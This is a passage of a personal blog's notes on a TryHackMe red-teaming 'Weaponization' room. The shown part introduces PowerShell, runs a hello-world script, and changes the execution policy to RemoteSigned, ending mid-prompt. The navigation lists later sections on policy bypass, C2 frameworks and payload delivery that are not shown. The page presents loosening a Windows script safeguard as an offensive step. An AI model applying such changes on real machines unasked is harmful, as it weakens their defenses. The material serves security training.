<!doctype html><html lang=en class=no-js> <head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=author content=0x5h1n0k0><link href=https://0x5h1n0k0.github.io/tryhackme/red-teaming/init-access/red-team-weaponization/ rel=canonical><link rel=icon href=../../../../assets/favicon.png><meta name=generator content="mkdocs-1.5.2, mkdocs-material-8.3.9"><title>Weaponization | 0x5h1n0k0</title><link rel=stylesheet href=../../../../assets/stylesheets/main.1d29e8d0.min.css><link rel=stylesheet href=../../../../assets/stylesheets/cur.css><link rel=stylesheet href=../../../../assets/stylesheets/footer.scss><link rel=stylesheet href=../../../../assets/stylesheets/palette.cbb835fc.min.css><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Fira+Sans:300,300i,400,400i,700,700i%7CFira+Code:400,400i,700,700i&display=fallback"><style>:root{--md-text-font:"Fira Sans";--md-code-font:"Fira Code"}</style><link rel=stylesheet href=../../../../stylesheets/extra.css><script>__md_scope=new URL("../../../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-XXXXXXXXXX"),document.addEventListener("DOMContentLoaded",function(){document.forms.search&&document.forms.search.query.addEventListener("blur",function(){this.value&&gtag("event","search",{search_term:this.value})}),"undefined"!=typeof location$&&location$.subscribe(function(e){gtag("config","G-XXXXXXXXXX",{page_path:e.pathname})})})</script><script async src="https://www.googletagmanager.com/gtag/js?id=G-XXXXXXXXXX"></script><link rel=stylesheet href=../../../../overrides/assets/stylesheets/main.82a244a8.min.css><!-- live 2d --><link href=https://r18-nmsl.cn/pio/pio.css rel=stylesheet type=text/css><!-- <link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css">
    <script src="https://fastly.jsdelivr.net/gh/stevenjoezhang/live2d-widget@latest/autoload.js"></script> --></head> <body dir=ltr data-md-color-scheme=slate data-md-color-primary=indigo data-md-color-accent=indigo> <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var key of Object.keys(palette.color))document.body.setAttribute("data-md-color-"+key,palette.color[key])</script> <input class=md-toggle data-md-toggle=drawer type=checkbox id=__drawer autocomplete=off> <input class=md-toggle data-md-toggle=search type=checkbox id=__search autocomplete=off> <label class=md-overlay for=__drawer></label> <div data-md-component=skip> <a href=#weaponization class=md-skip> Skip to content </a> </div> <div data-md-component=announce> </div> <header class=md-header data-md-component=header> <nav class="md-header__inner md-grid" aria-label=Header> <a href=../../../.. title=0x5h1n0k0 class="md-header__button md-logo" aria-label=0x5h1n0k0 data-md-component=logo> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 3 1 9l11 6 9-4.91V17h2V9M5 13.18v4L12 21l7-3.82v-4L12 17l-7-3.82z"></path></svg> </a> <label class="md-header__button md-icon" for=__drawer> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg> </label> <div class=md-header__title data-md-component=header-title> <div class=md-header__ellipsis> <div class=md-header__topic> <span class=md-ellipsis> 0x5h1n0k0 </span> </div> <div class=md-header__topic data-md-component=header-topic> <span class=md-ellipsis> Weaponization </span> </div> </div> </div> <form class=md-header__option data-md-component=palette> <input class=md-option data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme=slate data-md-color-primary=indigo data-md-color-accent=indigo aria-label="Switch to light mode" type=radio name=__palette id=__palette_1> <label class="md-header__button md-icon" title="Switch to light mode" for=__palette_2 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6zm0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4zM7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg> </label> <input class=md-option data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme=default data-md-color-primary=indigo data-md-color-accent=indigo aria-label="Switch to dark mode" type=radio name=__palette id=__palette_2> <label class="md-header__button md-icon" title="Switch to dark mode" for=__palette_1 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3Z"/></svg> </label> </form> <label class="md-header__button md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg> </label> <div class=md-search data-md-component=search role=dialog> <label class=md-search__overlay for=__search></label> <div class=md-search__inner role=search> <form class=md-search__form name=search> <input type=text class=md-search__input name=query aria-label=Search placeholder=Search autocapitalize=off autocorrect=off autocomplete=off spellcheck=false data-md-component=search-query required> <label class="md-search__icon md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg> </label> <nav class=md-search__options aria-label=Search> <a href=javascript:void(0) class="md-search__icon md-icon" aria-label=Share data-clipboard data-clipboard-text data-md-component=search-share tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7 0-.24-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91 1.61 0 2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08Z"/></svg> </a> <button type=reset class="md-search__icon md-icon" aria-label=Clear tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg> </button> </nav> <div class=md-search__suggest data-md-component=search-suggest></div> </form> <div class=md-search__output> <div class=md-search__scrollwrap data-md-scrollfix> <div class=md-search-result data-md-component=search-result> <div class=md-search-result__meta> Initializing search </div> <ol class=md-search-result__list></ol> </div> </div> </div> </div> </div> <div class=md-header__source> <a href=https://github.com/0x5h1n0k0/0x5h1n0k0.github.io title="Go to repository" class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><!-- Font Awesome Free 6.1.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg> </div> <div class=md-source__repository> 0x5h1n0k0/0x5h1n0k0.github.io <ul class=md-source__facts> </ul> </div> </a> </div> </nav> </header> <div class=md-container data-md-component=container> <main class=md-main data-md-component=main> <div class="md-main__inner md-grid"> <div class="md-sidebar md-sidebar--primary" data-md-component=sidebar data-md-type=navigation> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--primary" aria-label=Navigation data-md-level=0> <label class=md-nav__title for=__drawer> <a href=../../../.. title=0x5h1n0k0 class="md-nav__button md-logo" aria-label=0x5h1n0k0 data-md-component=logo> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 3 1 9l11 6 9-4.91V17h2V9M5 13.18v4L12 21l7-3.82v-4L12 17l-7-3.82z"></path></svg> </a> 0x5h1n0k0 </label> <div class=md-nav__source> <a href=https://github.com/0x5h1n0k0/0x5h1n0k0.github.io title="Go to repository" class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><!-- Font Awesome Free 6.1.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg> </div> <div class=md-source__repository> 0x5h1n0k0/0x5h1n0k0.github.io <ul class=md-source__facts> </ul> </div> </a> </div> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_1 type=checkbox id=__nav_1> <label class=md-nav__link for=__nav_1> PINNED <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=PINNED data-md-level=1> <label class=md-nav__title for=__nav_1> <span class="md-nav__icon md-icon"></span> PINNED </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_1_1 type=checkbox id=__nav_1_1> <label class=md-nav__link for=__nav_1_1> Privilege Escalation <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Privilege Escalation" data-md-level=2> <label class=md-nav__title for=__nav_1_1> <span class="md-nav__icon md-icon"></span> Privilege Escalation </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../notes/privilege-escalation/linux/ class=md-nav__link> Linux Privilege Escalation </a> </li> <li class=md-nav__item> <a href=../../../../notes/privilege-escalation/windows/ class=md-nav__link> Windows Privilege Escalation </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2 type=checkbox id=__nav_2 checked> <label class=md-nav__link for=__nav_2> Try Hack Me <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Try Hack Me" data-md-level=1> <label class=md-nav__title for=__nav_2> <span class="md-nav__icon md-icon"></span> Try Hack Me </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_1 type=checkbox id=__nav_2_1 checked> <label class=md-nav__link for=__nav_2_1> Learning Paths <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Learning Paths" data-md-level=2> <label class=md-nav__title for=__nav_2_1> <span class="md-nav__icon md-icon"></span> Learning Paths </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_1_1 type=checkbox id=__nav_2_1_1 checked> <label class=md-nav__link for=__nav_2_1_1> Red Teaming <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Red Teaming" data-md-level=3> <label class=md-nav__title for=__nav_2_1_1> <span class="md-nav__icon md-icon"></span> Red Teaming </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_1_1_1 type=checkbox id=__nav_2_1_1_1 checked> <label class=md-nav__link for=__nav_2_1_1_1> Init Access <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Init Access" data-md-level=4> <label class=md-nav__title for=__nav_2_1_1_1> <span class="md-nav__icon md-icon"></span> Init Access </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--active"> <input class="md-nav__toggle md-toggle" data-md-toggle=toc type=checkbox id=__toc> <label class="md-nav__link md-nav__link--active" for=__toc> Weaponization <span class="md-nav__icon md-icon"></span> </label> <a href=./ class="md-nav__link md-nav__link--active"> Weaponization </a> <nav class="md-nav md-nav--secondary" aria-label="Table of contents"> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> Table of contents </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#task-6-powershell-psh class=md-nav__link> Task 6: PowerShell - PSH </a> <nav class=md-nav aria-label="Task 6: PowerShell - PSH"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#powershell-psh class=md-nav__link> PowerShell (PSH) </a> </li> <li class=md-nav__item> <a href=#execution-policy class=md-nav__link> Execution Policy </a> </li> <li class=md-nav__item> <a href=#bypass-execution-policy class=md-nav__link> Bypass Execution Policy </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#task-7-command-and-control-c2-or-cc class=md-nav__link> Task 7: Command And Control - (C2 Or C&amp;C) </a> <nav class=md-nav aria-label="Task 7: Command And Control - (C2 Or C&C)"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#what-is-command-and-control-c2 class=md-nav__link> What is Command and Control (C2)? </a> </li> <li class=md-nav__item> <a href=#cobalt-strike class=md-nav__link> Cobalt Strike </a> </li> <li class=md-nav__item> <a href=#powershell-empire class=md-nav__link> PowerShell Empire </a> </li> <li class=md-nav__item> <a href=#metasploit class=md-nav__link> Metasploit </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#task-8-delivery-techniques class=md-nav__link> Task 8: Delivery Techniques </a> <nav class=md-nav aria-label="Task 8: Delivery Techniques"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#delivery-techniques class=md-nav__link> Delivery Techniques </a> </li> <li class=md-nav__item> <a href=#email-delivery class=md-nav__link> Email Delivery </a> </li> <li class=md-nav__item> <a href=#web-delivery class=md-nav__link> Web Delivery </a> </li> <li class=md-nav__item> <a href=#usb-delivery class=md-nav__link> USB Delivery </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#task-9-practice-arena class=md-nav__link> Task 9: Practice Arena </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../password-attacks/ class=md-nav__link> Password Attacks </a> </li> <li class=md-nav__item> <a href=../phishing/ class=md-nav__link> Phishing </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_1_1_2 type=checkbox id=__nav_2_1_1_2> <label class=md-nav__link for=__nav_2_1_1_2> Post Compromise <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Post Compromise" data-md-level=4> <label class=md-nav__title for=__nav_2_1_1_2> <span class="md-nav__icon md-icon"></span> Post Compromise </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../post-compromise/the-lay-of-the-land/ class=md-nav__link> The Lay of the Land </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_2 type=checkbox id=__nav_2_2> <label class=md-nav__link for=__nav_2_2> Room <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Room data-md-level=2> <label class=md-nav__title for=__nav_2_2> <span class="md-nav__icon md-icon"></span> Room </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../room/basic-pentesting/ class=md-nav__link> Basic Pentesting </a> </li> <li class=md-nav__item> <a href=../../../room/lianyu/ class=md-nav__link> Lian_Yu </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../../tags/tags/ class=md-nav__link> Categories </a> </li> </ul> </nav> </div> </div> </div> <div class="md-sidebar md-sidebar--secondary" data-md-component=sidebar data-md-type=toc> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--secondary" aria-label="Table of contents"> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> Table of contents </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#task-6-powershell-psh class=md-nav__link> Task 6: PowerShell - PSH </a> <nav class=md-nav aria-label="Task 6: PowerShell - PSH"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#powershell-psh class=md-nav__link> PowerShell (PSH) </a> </li> <li class=md-nav__item> <a href=#execution-policy class=md-nav__link> Execution Policy </a> </li> <li class=md-nav__item> <a href=#bypass-execution-policy class=md-nav__link> Bypass Execution Policy </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#task-7-command-and-control-c2-or-cc class=md-nav__link> Task 7: Command And Control - (C2 Or C&amp;C) </a> <nav class=md-nav aria-label="Task 7: Command And Control - (C2 Or C&C)"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#what-is-command-and-control-c2 class=md-nav__link> What is Command and Control (C2)? </a> </li> <li class=md-nav__item> <a href=#cobalt-strike class=md-nav__link> Cobalt Strike </a> </li> <li class=md-nav__item> <a href=#powershell-empire class=md-nav__link> PowerShell Empire </a> </li> <li class=md-nav__item> <a href=#metasploit class=md-nav__link> Metasploit </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#task-8-delivery-techniques class=md-nav__link> Task 8: Delivery Techniques </a> <nav class=md-nav aria-label="Task 8: Delivery Techniques"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#delivery-techniques class=md-nav__link> Delivery Techniques </a> </li> <li class=md-nav__item> <a href=#email-delivery class=md-nav__link> Email Delivery </a> </li> <li class=md-nav__item> <a href=#web-delivery class=md-nav__link> Web Delivery </a> </li> <li class=md-nav__item> <a href=#usb-delivery class=md-nav__link> USB Delivery </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#task-9-practice-arena class=md-nav__link> Task 9: Practice Arena </a> </li> </ul> </nav> </div> </div> </div> <div class=md-content data-md-component=content> <article class="md-content__inner md-typeset"> <aside class=mdx-author> </aside> <div class=tags-items style="color: var(--md-default-fg-color--light); padding-bottom: 10px; opacity: 0.9">Tags</div> <a href=https://github.com/0x5h1n0k0/0x5h1n0k0.github.io/edit/master/docs/tryhackme/red-teaming/init-access/red-team-weaponization/index.md title="Edit this page" class="md-content__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M10 20H6V4h7v5h5v3.1l2-2V8l-6-6H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h4v-2m10.2-7c.1 0 .3.1.4.2l1.3 1.3c.2.2.2.6 0 .8l-1 1-2.1-2.1 1-1c.1-.1.2-.2.4-.2m0 3.9L14.1 23H12v-2.1l6.1-6.1 2.1 2.1Z"/></svg> </a> <a href=https://github.com/0x5h1n0k0/0x5h1n0k0.github.io/edit/master/docs/tryhackme/red-teaming/init-access/red-team-weaponization/index.md title="View source of this page" class="md-content__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M17 18c.56 0 1 .44 1 1s-.44 1-1 1-1-.44-1-1 .44-1 1-1m0-3c-2.73 0-5.06 1.66-6 4 .94 2.34 3.27 4 6 4s5.06-1.66 6-4c-.94-2.34-3.27-4-6-4m0 6.5a2.5 2.5 0 0 1-2.5-2.5 2.5 2.5 0 0 1 2.5-2.5 2.5 2.5 0 0 1 2.5 2.5 2.5 2.5 0 0 1-2.5 2.5M9.27 20H6V4h7v5h5v4.07c.7.08 1.36.25 2 .49V8l-6-6H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h4.5a8.15 8.15 0 0 1-1.23-2Z"/></svg> </a> <nav class=md-tags> <a href=../../../../tags/tags/#thm-weaponization class=md-tag> THM-Weaponization </a> </nav> <h1 id=weaponization><strong>Weaponization</strong><a class=headerlink href=#weaponization title="Permanent link">&para;</a></h1><p style="color:#bdbdbd"><i>Estimated time to read: 15 minutes</i></p>
 <hr> <h2 id=task-6-powershell-psh><strong>Task 6: <abbr title="PowerShell is a task automation and configuration management program from Microsoft, consisting of a command-line shell and the associated scripting language.">PowerShell</abbr> - PSH</strong><a class=headerlink href=#task-6-powershell-psh title="Permanent link">&para;</a></h2> <h3 id=powershell-psh><strong><abbr title="PowerShell is a task automation and configuration management program from Microsoft, consisting of a command-line shell and the associated scripting language.">PowerShell</abbr> (PSH)</strong><a class=headerlink href=#powershell-psh title="Permanent link">&para;</a></h3> <p><abbr title="PowerShell is a task automation and configuration management program from Microsoft, consisting of a command-line shell and the associated scripting language.">PowerShell</abbr> is an object-oriented programming language executed from the Dynamic Language Runtime (DLR) in .NET with some exceptions for legacy uses. Check out the TryHackMe room, <a href=/blog/room/hacking-with-powershell/ >Hacking with <abbr title="PowerShell is a task automation and configuration management program from Microsoft, consisting of a command-line shell and the associated scripting language.">PowerShell</abbr> for more information about <abbr title="PowerShell is a task automation and configuration management program from Microsoft, consisting of a command-line shell and the associated scripting language.">PowerShell</abbr></a>.</p> <p>Red teamers rely on <abbr title="PowerShell is a task automation and configuration management program from Microsoft, consisting of a command-line shell and the associated scripting language.">PowerShell</abbr> in performing various activities, including initial access, system enumerations, and many others. Let's start by creating a straightforward <abbr title="PowerShell is a task automation and configuration management program from Microsoft, consisting of a command-line shell and the associated scripting language.">PowerShell</abbr> script that prints "Welcome to the Weaponization Room!" as follows,</p> <div class=highlight><pre><span></span><code><a id=__codelineno-0-1 name=__codelineno-0-1 href=#__codelineno-0-1></a><span class=nb>Write-Output</span> <span class=s2>&quot;Welcome to the Weaponization Room!&quot;</span>
</code></pre></div> <p>Save the file as <code>thm.ps1</code>. With the <code>Write-Output</code>, we print the message "Welcome to the Weaponization Room!" to the command prompt. Now let's run it and see the result.</p> <div class=highlight><span class=filename>CMD</span><pre><span></span><code><a id=__codelineno-1-1 name=__codelineno-1-1 href=#__codelineno-1-1></a><span class=n>C</span><span class=p>:\</span><span class=n>Users</span><span class=p>\</span><span class=n>thm</span><span class=p>\</span><span class=n>Desktop</span><span class=p>&gt;</span><span class=n>powershell</span> <span class=o>-File</span> <span class=n>thm</span><span class=p>.</span><span class=n>ps1</span>
<a id=__codelineno-1-2 name=__codelineno-1-2 href=#__codelineno-1-2></a><span class=n>File</span> <span class=n>C</span><span class=p>:\</span><span class=n>Users</span><span class=p>\</span><span class=n>thm</span><span class=p>\</span><span class=n>Desktop</span><span class=p>\</span><span class=n>thm</span><span class=p>.</span><span class=n>ps1</span> <span class=n>cannot</span> <span class=n>be</span> <span class=n>loaded</span> <span class=n>because</span> <span class=n>running</span> <span class=n>scripts</span> <span class=n>is</span> <span class=n>disabled</span> <span class=n>on</span> <span class=n>this</span> <span class=n>system</span><span class=p>.</span> <span class=k>For</span> <span class=n>more</span>
<a id=__codelineno-1-3 name=__codelineno-1-3 href=#__codelineno-1-3></a><span class=n>information</span><span class=p>,</span> <span class=n>see</span> <span class=n>about_Execution_Policies</span> <span class=n>at</span> <span class=n>http</span><span class=p>://</span><span class=n>go</span><span class=p>.</span><span class=n>microsoft</span><span class=p>.</span><span class=n>com</span><span class=p>/</span><span class=n>fwlink</span><span class=p>/</span><span class=k>?</span><span class=n>LinkID</span><span class=p>=</span><span class=n>135170</span><span class=p>.</span>
<a id=__codelineno-1-4 name=__codelineno-1-4 href=#__codelineno-1-4></a>    <span class=p>+</span> <span class=n>CategoryInfo</span>          <span class=p>:</span> <span class=n>SecurityError</span><span class=p>:</span> <span class=p>(:)</span> <span class=p>[],</span> <span class=n>ParentContainsErrorRecordException</span>
<a id=__codelineno-1-5 name=__codelineno-1-5 href=#__codelineno-1-5></a>    <span class=p>+</span> <span class=n>FullyQualifiedErrorId</span> <span class=p>:</span> <span class=n>UnauthorizedAccess</span>
<a id=__codelineno-1-6 name=__codelineno-1-6 href=#__codelineno-1-6></a>
<a id=__codelineno-1-7 name=__codelineno-1-7 href=#__codelineno-1-7></a><span class=n>C</span><span class=p>:\</span><span class=n>Users</span><span class=p>\</span><span class=n>thm</span><span class=p>\</span><span class=n>Desktop</span><span class=p>&gt;</span>
</code></pre></div> <h3 id=execution-policy><strong>Execution Policy</strong><a class=headerlink href=#execution-policy title="Permanent link">&para;</a></h3> <p><abbr title="PowerShell is a task automation and configuration management program from Microsoft, consisting of a command-line shell and the associated scripting language.">PowerShell</abbr>'s execution policy is a <strong>security option</strong> to protect the system from running malicious scripts. By default, Microsoft disables executing <abbr title="PowerShell is a task automation and configuration management program from Microsoft, consisting of a command-line shell and the associated scripting language.">PowerShell</abbr> scripts <code>.ps1</code> for security purposes. The <abbr title="PowerShell is a task automation and configuration management program from Microsoft, consisting of a command-line shell and the associated scripting language.">PowerShell</abbr> execution policy is set to <code>Restricted</code>, which means it permits individual commands but not run any scripts.</p> <div class=highlight><span class=filename>CMD</span><pre><span></span><code><a id=__codelineno-2-1 name=__codelineno-2-1 href=#__codelineno-2-1></a><span class=nb>PS </span><span class=n>C</span><span class=p>:\</span><span class=n>Users</span><span class=p>\</span><span class=n>thm</span><span class=p>&gt;</span> <span class=nb>Get-ExecutionPolicy</span>
<a id=__codelineno-2-2 name=__codelineno-2-2 href=#__codelineno-2-2></a><span class=n>Restricted</span>
</code></pre></div> <p>We can also easily change the <abbr title="PowerShell is a task automation and configuration management program from Microsoft, consisting of a command-line shell and the associated scripting language.">PowerShell</abbr> execution policy by running:</p> <div class=highlight><span class=filename>CMD</span><pre><span></span><code><a id=__codelineno-3-1 name=__codelineno-3-1 href=#__codelineno-3-1></a><span class=nb>PS </span><span class=n>C</span><span class=p>:\</span><span class=n>Users</span><span class=p>\</span><span class=n>thm</span><span class=p>\</span><span class=n>Desktop</span><span class=p>&gt;</span> <span class=nb>Set-ExecutionPolicy</span> <span class=n>-Scope</span> <span class=n>CurrentUser</span> <span class=n>RemoteSigned</span>
<a id=__codelineno-3-2 name=__codelineno-3-2 href=#__codelineno-3-2></a>
<a id=__codelineno-3-3 name=__codelineno-3-3 href=#__codelineno-3-3></a><span class=n>Execution</span> <span class=n>Policy</span> <span class=n>Change</span>
<a id=__codelineno-3-4 name=__codelineno-3-4 href=#__codelineno-3-4></a><span class=n>The</span> <span class=n>execution</span> <span class=n>policy</span> <span class=n>helps</span> <span class=n>protect</span> <span class=n>you</span> <span class=n>from</span> <span class=n>scripts</span> <span class=n>that</span> <span class=n>you</span> <span class=k>do</span> <span class=n>not</span> <span class=n>trust</span><span class=p>.</span> <span class=n>Changing</span> <span class=n>the</span> <span class=n>execution</span> <span class=n>policy</span> <span class=n>might</span> <span class=n>expose</span>
<a id=__codelineno-3-5 name=__codelineno-3-5 href=#__codelineno-3-5></a><span class=n>you</span> <span class=n>to</span> <span class=n>the</span> <span class=n>security</span> <span class=n>risks</span> <span class=n>described</span> <span class=k>in</span> <span class=n>the</span> <span class=n>about_Execution_Policies</span> <span class=n>help</span> <span class=n>topic</span> <span class=n>at</span>
<a id=__codelineno-3-6 name=__codelineno-3-6 href=#__codelineno-3-6></a><span class=n>http</span><span class=p>://</span><span class=n>go</span><span class=p>.</span><span class=n>microsoft</span><span class=p>.</span><span class=n>com</span><span class=p>/</span><span class=n>fwlink</span><span class=p>/</span><span class=k>?</span><span class=n>LinkID</span><span class=p>=</span><span class=n>135170</span><span class=p>.</span> <span class=k>Do</span> <span class=n>you</span> <span class=n>want</span> <span class=n>to</span> <span class=n>change</span> <span class=n>the</span> <span class=n>execution</span> <span class=n>policy</span><span class=p>?</span>
